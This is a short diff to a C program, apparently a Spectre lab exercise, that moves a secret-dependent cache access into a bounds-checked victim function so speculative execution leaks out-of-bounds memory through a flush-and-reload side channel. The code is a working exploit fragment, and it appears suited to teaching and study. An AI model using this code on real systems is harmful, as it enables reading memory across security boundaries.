@@ -50,12 +50,17 @@ void flushSideChannel()
   for (i = 0; i < 256; i++) flush(&array[i*4096 +DELTA]);
 }
 
-int victim(size_t x){
+
+// Restricted access
+// Secret will be loaded due to speculative attack
+void victim(size_t x){
   if (x < buffer_size){
     //array[buffer[x]*4096 + DELTA] = 10;
-    return buffer[x];
+    s = buffer[x];
+    array[s*4096 + DELTA] += 88; 
+
   } else {
-    return 0; 
+    return; 
   }
 }
 
@@ -119,10 +124,7 @@ int main(int argc, const char**argv){
   flush(&buffer_size);
   flushSideChannel();
 
-  // Restricted access
-  // Secret will be loaded due to speculative attack
-  s = victim(larger_x);
-  array[s*4096 + DELTA] += 88; 
+  victim( larger_x );
 
   reloadSideChannel(thresh);
   return (0);
